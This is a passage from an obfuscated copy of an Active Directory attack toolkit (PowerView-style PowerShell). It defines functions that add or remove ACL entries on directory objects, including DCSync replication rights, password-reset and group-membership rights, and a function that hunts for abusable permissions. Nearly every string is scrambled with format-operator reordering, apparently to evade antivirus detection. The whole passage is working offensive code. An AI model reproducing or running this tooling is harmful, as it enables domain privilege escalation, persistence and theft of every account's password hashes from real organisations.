        [ValidateSet({"{0}{1}" -f 'Ba','se'}, {"{2}{1}{0}"-f'el','neLev','O'}, {"{2}{0}{1}"-f 't','ree','Sub'})]
        [String]
        $SearchScope = ("{0}{2}{1}"-f 'Subtr','e','e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', {"{3}{2}{1}{0}"-f'sword','s','tPa','Rese'}, {"{2}{1}{0}" -f'eMembers','rit','W'}, {"{1}{0}" -f 'ync','DCS'})]
        [String]
        $Rights = 'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            ("{1}{0}{2}"-f'ro','P','perties') = ("{5}{4}{1}{0}{3}{2}"-f 'n','ed','me','a','uish','disting')
            'Raw' = $True
        }
        if ($PSBoundParameters[("{2}{3}{1}{0}"-f 'omain','tD','Targ','e')]) { $TargetSearcherArguments[("{1}{0}"-f 'ain','Dom')] = $TargetDomain }
        if ($PSBoundParameters[("{3}{2}{0}{1}{4}" -f 'g','etL','ar','T','DAPFilter')]) { $TargetSearcherArguments[("{1}{0}{2}" -f'il','LDAPF','ter')] = $TargetLDAPFilter }
        if ($PSBoundParameters[("{0}{3}{1}{2}" -f'T','etSear','chBase','arg')]) { $TargetSearcherArguments[("{1}{2}{3}{0}" -f'e','S','earchBa','s')] = $TargetSearchBase }
        if ($PSBoundParameters[("{2}{1}{0}"-f'r','e','Serv')]) { $TargetSearcherArguments[("{2}{1}{0}"-f'ver','r','Se')] = $Server }
        if ($PSBoundParameters[("{2}{0}{1}{3}" -f'rc','hSco','Sea','pe')]) { $TargetSearcherArguments[("{1}{2}{0}" -f'pe','S','earchSco')] = $SearchScope }
        if ($PSBoundParameters[("{0}{4}{1}{2}{3}"-f 'ResultP','ge','S','ize','a')]) { $TargetSearcherArguments[("{0}{2}{3}{1}"-f 'Res','geSize','ul','tPa')] = $ResultPageSize }
        if ($PSBoundParameters[("{0}{3}{1}{2}"-f 'ServerTime','i','t','Lim')]) { $TargetSearcherArguments[("{0}{3}{1}{2}"-f'Se','erTimeLim','it','rv')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{1}{3}{0}"-f'e','om','T','bston')]) { $TargetSearcherArguments[("{3}{0}{1}{2}"-f 'mbs','ton','e','To')] = $Tombstone }
        if ($PSBoundParameters[("{0}{1}{2}"-f'Cre','dentia','l')]) { $TargetSearcherArguments[("{2}{0}{1}" -f 'reden','tial','C')] = $Credential }

        $PrincipalSearcherArguments = @{
            ("{1}{0}{2}" -f'n','Ide','tity') = $PrincipalIdentity
            ("{0}{2}{1}"-f'Propert','s','ie') = ("{0}{2}{1}{5}{3}{4}"-f 'distinguishednam','c','e,obje','i','d','ts')
        }
        if ($PSBoundParameters[("{2}{0}{1}" -f'l','Domain','Principa')]) { $PrincipalSearcherArguments[("{2}{1}{0}" -f'in','ma','Do')] = $PrincipalDomain }
        if ($PSBoundParameters[("{0}{2}{1}" -f 'Se','r','rve')]) { $PrincipalSearcherArguments[("{0}{1}"-f 'Serv','er')] = $Server }
        if ($PSBoundParameters[("{0}{3}{2}{1}"-f'SearchS','pe','o','c')]) { $PrincipalSearcherArguments[("{2}{3}{1}{0}" -f 'cope','S','Searc','h')] = $SearchScope }
        if ($PSBoundParameters[("{1}{0}{2}{3}"-f'ultPa','Res','geSiz','e')]) { $PrincipalSearcherArguments[("{0}{3}{2}{1}"-f 'Res','e','ltPageSiz','u')] = $ResultPageSize }
        if ($PSBoundParameters[("{1}{0}{2}{3}{4}"-f'rverT','Se','ime','Lim','it')]) { $PrincipalSearcherArguments[("{3}{1}{2}{4}{0}"-f'it','eL','i','ServerTim','m')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{3}{2}{0}{1}"-f 'ton','e','ombs','T')]) { $PrincipalSearcherArguments[("{0}{2}{1}" -f 'Tombs','e','ton')] = $Tombstone }
        if ($PSBoundParameters[("{0}{1}{3}{2}"-f'Creden','ti','l','a')]) { $PrincipalSearcherArguments[("{2}{0}{1}" -f'de','ntial','Cre')] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw ('Unab'+'le '+'to'+' '+'resol'+'ve'+' '+'princ'+'ip'+'al: '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        $TargetSearcherArguments[("{0}{1}{2}"-f'Ide','n','tity')] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{1}{0}" -f 'ne','No')
            $ControlType = [System.Security.AccessControl.AccessControlType] ("{0}{1}"-f 'All','ow')
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    
                    ("{2}{4}{0}{1}{3}"-f'etPas','swor','R','d','es') { ("{6}{5}{0}{2}{4}{3}{1}{7}"-f '9570-24','-a7','6d','d0','-11','9','002','68-00aa006e0529') }
                    
                    ("{2}{3}{0}{1}" -f 'teMe','mbers','Wr','i') { ("{5}{1}{0}{2}{4}{3}{6}{7}{8}"-f 'de6-1','0','1d0-a28','00','5-','bf9679c0-','aa0','0304','9e2') }
                    
                    
                    
                    
                    ("{0}{2}{1}" -f'D','nc','CSy') { ("{4}{0}{2}{3}{5}{1}{6}" -f '-9c','0c04fc','07-11d1-','f7','1131f6aa','9f-0','2dcd2'), ("{6}{8}{1}{7}{4}{2}{0}{5}{3}{9}" -f'1d1-f79f-0','d-','1','fc2','-','0c04','11','9c07','31f6a','dcd2'), ("{1}{5}{3}{0}{4}{2}"-f '4c62-991a','89e','640c','6-444d-','-0facbeda','95b7')}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) "

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ("{0}{2}{1}{3}" -f'Ext','ndedRigh','e','t')
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{0}{3}{1}" -f 'er','All','Gen','ic')
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = ("{1}{0}" -f 'acl','D')
                        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function Remove-DomainObjectAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}" -f 'SS','ho','P','uldProcess'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{4}{1}{5}{3}{0}{2}" -f 'm','stinguish','e','a','Di','edN'}, {"{2}{1}{0}" -f'e','untNam','SamAcco'}, {"{1}{0}" -f 'e','Nam'})]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'r','Filte'})]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{4}{5}{0}" -f'ler','Co','n','Domai','ntro','l'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f 'Bas','e'}, {"{0}{1}{2}"-f 'OneLev','e','l'}, {"{0}{1}"-f'Subt','ree'})]
        [String]
        $SearchScope = ("{1}{0}" -f'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', {"{0}{3}{2}{1}" -f'ResetPas','d','wor','s'}, {"{2}{3}{0}{1}"-f'ite','Members','W','r'}, {"{1}{0}"-f 'Sync','DC'})]
        [String]
        $Rights = 'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            ("{1}{0}{2}"-f 'ti','Proper','es') = ("{2}{1}{3}{5}{4}{0}" -f 'ame','st','di','ing','n','uished')
            'Raw' = $True
        }
        if ($PSBoundParameters[("{0}{1}{2}" -f 'Tar','getDomai','n')]) { $TargetSearcherArguments[("{1}{2}{0}" -f 'n','Do','mai')] = $TargetDomain }
        if ($PSBoundParameters[("{1}{4}{0}{5}{2}{3}" -f 'ge','Ta','LD','APFilter','r','t')]) { $TargetSearcherArguments[("{2}{0}{1}" -f'PF','ilter','LDA')] = $TargetLDAPFilter }
        if ($PSBoundParameters[("{1}{0}{2}{3}" -f'r','Ta','g','etSearchBase')]) { $TargetSearcherArguments[("{1}{0}{2}"-f 'Ba','Search','se')] = $TargetSearchBase }
        if ($PSBoundParameters[("{0}{2}{1}"-f'Ser','er','v')]) { $TargetSearcherArguments[("{1}{0}"-f 'r','Serve')] = $Server }
        if ($PSBoundParameters[("{0}{2}{1}" -f'SearchS','pe','co')]) { $TargetSearcherArguments[("{1}{0}{3}{2}"-f'arc','Se','e','hScop')] = $SearchScope }
        if ($PSBoundParameters[("{3}{1}{2}{0}"-f 'ze','Pa','geSi','Result')]) { $TargetSearcherArguments[("{0}{1}{3}{2}"-f'Res','ultPa','ize','geS')] = $ResultPageSize }
        if ($PSBoundParameters[("{2}{3}{0}{1}{4}"-f 'verTim','eLim','Se','r','it')]) { $TargetSearcherArguments[("{2}{4}{3}{0}{1}"-f 'm','it','S','rverTimeLi','e')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{1}"-f 'Tomb','stone')]) { $TargetSearcherArguments[("{0}{1}{2}"-f'To','mb','stone')] = $Tombstone }
        if ($PSBoundParameters[("{2}{0}{1}"-f'a','l','Credenti')]) { $TargetSearcherArguments[("{2}{0}{1}" -f 'redent','ial','C')] = $Credential }

        $PrincipalSearcherArguments = @{
            ("{2}{0}{1}"-f't','ity','Iden') = $PrincipalIdentity
            ("{1}{0}{2}"-f'ropert','P','ies') = ("{1}{5}{6}{4}{0}{3}{2}" -f'a','dist','jectsid','me,ob','edn','ingui','sh')
        }
        if ($PSBoundParameters[("{0}{3}{2}{1}"-f 'Prin','n','ai','cipalDom')]) { $PrincipalSearcherArguments[("{2}{1}{0}"-f'n','omai','D')] = $PrincipalDomain }
        if ($PSBoundParameters[("{1}{0}" -f'erver','S')]) { $PrincipalSearcherArguments[("{0}{1}{2}"-f'Se','rve','r')] = $Server }
        if ($PSBoundParameters[("{0}{2}{3}{1}" -f'S','Scope','ear','ch')]) { $PrincipalSearcherArguments[("{0}{2}{3}{1}"-f 'S','Scope','ear','ch')] = $SearchScope }
        if ($PSBoundParameters[("{1}{3}{2}{0}"-f'Size','ResultP','ge','a')]) { $PrincipalSearcherArguments[("{1}{2}{0}{4}{3}"-f 'tPageS','R','esul','e','iz')] = $ResultPageSize }
        if ($PSBoundParameters[("{4}{2}{3}{1}{0}"-f 'meLimit','i','rver','T','Se')]) { $PrincipalSearcherArguments[("{3}{4}{0}{1}{2}"-f'e','Lim','it','ServerTi','m')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{0}{1}" -f 'on','e','Tombst')]) { $PrincipalSearcherArguments[("{2}{0}{1}" -f'bsto','ne','Tom')] = $Tombstone }
        if ($PSBoundParameters[("{2}{1}{0}" -f 'tial','reden','C')]) { $PrincipalSearcherArguments[("{1}{0}{2}" -f 'a','Credenti','l')] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw ('Un'+'able'+' '+'t'+'o '+'re'+'solve '+'pr'+'in'+'cipal: '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        $TargetSearcherArguments[("{1}{0}{2}"-f 'entit','Id','y')] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{0}{1}" -f'No','ne')
            $ControlType = [System.Security.AccessControl.AccessControlType] ("{0}{1}"-f'Allo','w')
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    
                    ("{0}{2}{1}"-f 'R','Password','eset') { ("{6}{1}{8}{4}{7}{0}{5}{2}{3}"-f '0','029957','06e052','9','d0-a768-','aa0','0','0','0-246d-11') }
                    
                    ("{0}{1}{2}" -f 'W','riteMe','mbers') { ("{6}{5}{7}{8}{4}{3}{0}{1}{2}"-f '04','9','e2','6-11d0-a285-00aa003','e','79c0','bf96','-','0d') }
                    
                    
                    
                    
                    ("{1}{0}" -f 'Sync','DC') { ("{5}{7}{8}{2}{6}{9}{1}{3}{0}{10}{4}" -f'2d','f','a','c','2','1131','-9c07-11d1-f79f-00c','f6','a','04','cd'), ("{7}{4}{0}{3}{1}{5}{6}{2}" -f'-','d','c04fc2dcd2','11','07','1-f79','f-00','1131f6ad-9c'), ("{1}{4}{5}{2}{0}{3}" -f'-4c62','89e','d','-991a-0facbeda640c','95b','76-444')}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) "

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{0}{1}" -f 'de','dRight','Exten')
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{1}{0}" -f 'ericAll','en','G')
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = ("{0}{1}" -f 'Da','cl')
                        $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function Find-InterestingDomainAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{2}"-f 'h','ouldP','rocess','PSS'}, '')]
    [OutputType({"{0}{2}{1}"-f 'P','ew.ACL','owerVi'})]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{2}{0}"-f'me','Doma','inNa'}, {"{0}{1}" -f 'N','ame'})]
        [String]
        $Domain,

        [Switch]
        $ResolveGUIDs,

        [String]
        [ValidateSet('All', {"{1}{3}{2}{0}"-f 'ord','Res','sw','etPas'}, {"{0}{3}{2}{1}"-f 'Wri','rs','mbe','teMe'})]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'er','lt','Fi'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'h','Pat','ADS'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{0}" -f'r','trolle','Con','Domain'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f 'se','Ba'}, {"{2}{0}{1}" -f'eLe','vel','On'}, {"{1}{0}"-f'ree','Subt'})]
        [String]
        $SearchScope = ("{0}{2}{1}"-f 'Sub','ee','tr'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ACLArguments = @{}
        if ($PSBoundParameters[("{0}{1}{2}{3}" -f 'R','e','solve','GUIDs')]) { $ACLArguments[("{2}{0}{1}"-f'eGUI','Ds','Resolv')] = $ResolveGUIDs }
        if ($PSBoundParameters[("{3}{1}{2}{0}" -f'ilter','g','htsF','Ri')]) { $ACLArguments[("{1}{3}{2}{0}" -f'er','Rig','tsFilt','h')] = $RightsFilter }
        if ($PSBoundParameters[("{0}{1}{2}{3}" -f'LDAP','F','ilt','er')]) { $ACLArguments[("{2}{0}{1}"-f 'DAPFilte','r','L')] = $LDAPFilter }
        if ($PSBoundParameters[("{1}{2}{3}{0}"-f'se','S','earch','Ba')]) { $ACLArguments[("{2}{1}{0}" -f'e','rchBas','Sea')] = $SearchBase }
        if ($PSBoundParameters[("{1}{0}"-f'r','Serve')]) { $ACLArguments[("{0}{1}"-f 'S','erver')] = $Server }
        if ($PSBoundParameters[("{0}{2}{3}{1}" -f'S','e','ear','chScop')]) { $ACLArguments[("{2}{3}{1}{0}" -f'cope','S','Sea','rch')] = $SearchScope }
        if ($PSBoundParameters[("{0}{2}{3}{1}{4}" -f 'Resu','z','l','tPageSi','e')]) { $ACLArguments[("{2}{0}{4}{1}{3}" -f'lt','eSi','Resu','ze','Pag')] = $ResultPageSize }
        if ($PSBoundParameters[("{3}{0}{2}{4}{1}" -f 'erTi','mit','meL','Serv','i')]) { $ACLArguments[("{2}{1}{3}{0}"-f 'imeLimit','v','Ser','erT')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{0}{1}" -f 'ston','e','Tomb')]) { $ACLArguments[("{2}{1}{0}"-f'ne','bsto','Tom')] = $Tombstone }
        if ($PSBoundParameters[("{2}{0}{1}"-f'ia','l','Credent')]) { $ACLArguments[("{1}{3}{2}{0}" -f'l','Cre','ntia','de')] = $Credential }

        $ObjectSearcherArguments = @{
            ("{2}{1}{0}"-f'ties','er','Prop') = ("{1}{0}{5}{3}{2}{4}" -f 'accountn','sam','e,ob','m','jectclass','a')
            'Raw' = $True
        }
        if ($PSBoundParameters[("{0}{2}{1}"-f'S','rver','e')]) { $ObjectSearcherArguments[("{1}{0}{2}"-f've','Ser','r')] = $Server }
        if ($PSBoundParameters[("{1}{2}{0}"-f 'cope','Se','archS')]) { $ObjectSearcherArguments[("{1}{0}{2}" -f 'hS','Searc','cope')] = $SearchScope }
        if ($PSBoundParameters[("{2}{1}{3}{4}{0}" -f 'ze','esultP','R','ag','eSi')]) { $ObjectSearcherArguments[("{2}{3}{1}{0}" -f 'eSize','ag','Res','ultP')] = $ResultPageSize }
        if ($PSBoundParameters[("{4}{2}{0}{1}{3}" -f'verTi','meLi','r','mit','Se')]) { $ObjectSearcherArguments[("{2}{4}{0}{3}{1}"-f 'e','t','Se','Limi','rverTim')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{1}{2}"-f'T','ombston','e')]) { $ObjectSearcherArguments[("{1}{0}"-f 'tone','Tombs')] = $Tombstone }
        if ($PSBoundParameters[("{0}{1}{2}" -f'Crede','n','tial')]) { $ObjectSearcherArguments[("{0}{2}{1}" -f'C','l','redentia')] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters[("{1}{0}"-f 'erver','S')]) { $ADNameArguments[("{2}{1}{0}" -f'er','erv','S')] = $Server }
        if ($PSBoundParameters[("{1}{0}{2}" -f 'redent','C','ial')]) { $ADNameArguments[("{2}{1}{0}"-f'ential','d','Cre')] = $Credential }

        
        $ResolvedSIDs = @{}
    }

    PROCESS {
        if ($PSBoundParameters[("{1}{0}"-f 'n','Domai')]) {
            $ACLArguments[("{0}{1}" -f'Dom','ain')] = $Domain
            $ADNameArguments[("{1}{0}"-f 'ain','Dom')] = $Domain
        }

        Get-DomainObjectAcl @ACLArguments | ForEach-Object {

            if ( ($_.ActiveDirectoryRights -match ((("{1}{6}{5}{3}{7}{2}{0}{4}" -f'reate{0}Delet','Ge','0}C','r','e','l{0}W','nericAl','ite{'))-f  [cHar]124)) -or (($_.ActiveDirectoryRights -match ("{1}{0}{3}{2}"-f'dedR','Exten','t','igh')) -and ($_.AceQualifier -match ("{1}{0}"-f 'ow','All')))) {
                
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]

                        $InterestingACL = New-Object PSObject
                        $InterestingACL | Add-Member NoteProperty ("{1}{0}"-f'jectDN','Ob') $_.ObjectDN
                        $InterestingACL | Add-Member NoteProperty ("{0}{2}{1}" -f 'A','fier','ceQuali') $_.AceQualifier
                        $InterestingACL | Add-Member NoteProperty ("{5}{1}{4}{0}{2}{3}" -f 'ryRig','iveD','h','ts','irecto','Act') $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $InterestingACL | Add-Member NoteProperty ("{2}{3}{1}{0}"-f 'eType','ctAc','Obj','e') $_.ObjectAceType
                        }
                        else {
                            $InterestingACL | Add-Member NoteProperty ("{1}{0}{2}" -f'ctAceTyp','Obje','e') ("{0}{1}"-f 'N','one')
                        }
                        $InterestingACL | Add-Member NoteProperty ("{1}{0}{2}" -f'g','AceFla','s') $_.AceFlags
                        $InterestingACL | Add-Member NoteProperty ("{0}{1}"-f 'AceTy','pe') $_.AceType
                        $InterestingACL | Add-Member NoteProperty ("{4}{0}{1}{2}{3}"-f 'tance','F','l','ags','Inheri') $_.InheritanceFlags
                        $InterestingACL | Add-Member NoteProperty ("{3}{1}{4}{2}{5}{0}"-f 'r','ecu','fi','S','rityIdenti','e') $_.SecurityIdentifier
                        $InterestingACL | Add-Member NoteProperty ("{5}{3}{0}{1}{2}{4}"-f'ityRefe','renceN','am','ent','e','Id') $IdentityReferenceName
                        $InterestingACL | Add-Member NoteProperty ("{5}{1}{3}{2}{4}{0}"-f 'n','fer','nceDo','e','mai','IdentityRe') $IdentityReferenceDomain
                        $InterestingACL | Add-Member NoteProperty ("{0}{1}{2}{3}{4}"-f'Identity','R','ef','erence','DN') $IdentityReferenceDN
                        $InterestingACL | Add-Member NoteProperty ("{5}{1}{6}{3}{2}{0}{4}" -f 'r','i','e','yRef','enceClass','Ident','t') $IdentityReferenceClass
                        $InterestingACL
                    }
                    else {
                        $IdentityReferenceDN = Convert-ADName -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
                        

                        if ($IdentityReferenceDN) {
                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            
                            $ObjectSearcherArguments[("{0}{1}"-f'Domai','n')] = $IdentityReferenceDomain
                            $ObjectSearcherArguments[("{1}{0}{2}"-f 'dentit','I','y')] = $IdentityReferenceDN
                            
                            $Object = Get-DomainObject @ObjectSearcherArguments

                            if ($Object) {
                                $IdentityReferenceName = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match ("{1}{0}" -f'mputer','co')) {
                                    $IdentityReferenceClass = ("{0}{1}{2}" -f 'com','put','er')
                                }
                                elseif ($Object.Properties.objectclass -match ("{0}{1}" -f 'gr','oup')) {
                                    $IdentityReferenceClass = ("{1}{0}"-f'roup','g')
                                }
                                elseif ($Object.Properties.objectclass -match ("{0}{1}"-f'u','ser')) {
                                    $IdentityReferenceClass = ("{1}{0}" -f'ser','u')
                                }
                                else {
                                    $IdentityReferenceClass = $Null
                                }

                                
                                $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass

                                $InterestingACL = New-Object PSObject
                                $InterestingACL | Add-Member NoteProperty ("{1}{2}{0}" -f'DN','O','bject') $_.ObjectDN
                                $InterestingACL | Add-Member NoteProperty ("{2}{1}{0}"-f 'r','e','AceQualifi') $_.AceQualifier
                                $InterestingACL | Add-Member NoteProperty ("{0}{4}{3}{1}{2}"-f'Activ','or','yRights','t','eDirec') $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $InterestingACL | Add-Member NoteProperty ("{1}{2}{0}"-f'AceType','Ob','ject') $_.ObjectAceType
                                }
                                else {
                                    $InterestingACL | Add-Member NoteProperty ("{0}{1}{2}"-f 'O','bjectAceT','ype') ("{1}{0}"-f'one','N')
                                }
                                $InterestingACL | Add-Member NoteProperty ("{0}{1}" -f'AceFlag','s') $_.AceFlags
                                $InterestingACL | Add-Member NoteProperty ("{2}{0}{1}"-f 'y','pe','AceT') $_.AceType
                                $InterestingACL | Add-Member NoteProperty ("{3}{1}{0}{2}" -f'itanceFl','nher','ags','I') $_.InheritanceFlags
                                $InterestingACL | Add-Member NoteProperty ("{2}{3}{0}{1}" -f'rityId','entifier','Se','cu') $_.SecurityIdentifier
                                $InterestingACL | Add-Member NoteProperty ("{1}{4}{0}{6}{2}{5}{3}"-f'feren','Identit','e','me','yRe','Na','c') $IdentityReferenceName
                                $InterestingACL | Add-Member NoteProperty ("{3}{2}{1}{4}{0}" -f 'n','ceD','ren','IdentityRefe','omai') $IdentityReferenceDomain
                                $InterestingACL | Add-Member NoteProperty ("{4}{2}{3}{5}{0}{1}"-f 'eferen','ceDN','d','enti','I','tyR') $IdentityReferenceDN
                                $InterestingACL | Add-Member NoteProperty ("{3}{2}{4}{0}{1}"-f'renceC','lass','dentity','I','Refe') $IdentityReferenceClass
                                $InterestingACL
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName "
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainOU {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}"-f 'd','rocess','P','PSShoul'}, '')]
    [OutputType({"{2}{3}{1}{0}" -f 'OU','w.','PowerVi','e'})]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}"-f 'ame','N'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{0}{1}"-f 'G','UID'})]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'r','Filte'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'A','D','SPath'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{4}{1}"-f 'in','r','Doma','Co','ntrolle'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{1}{0}{2}" -f 'v','OneLe','el'}, {"{0}{1}" -f 'Sub','tree'})]
        [String]
        $SearchScope = ("{0}{1}"-f'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{1}{0}" -f'l','Dac'}, {"{0}{1}"-f'G','roup'}, {"{0}{1}" -f'N','one'}, {"{0}{1}" -f'O','wner'}, {"{1}{0}"-f'l','Sac'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias({"{1}{0}{2}" -f'urnO','Ret','ne'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
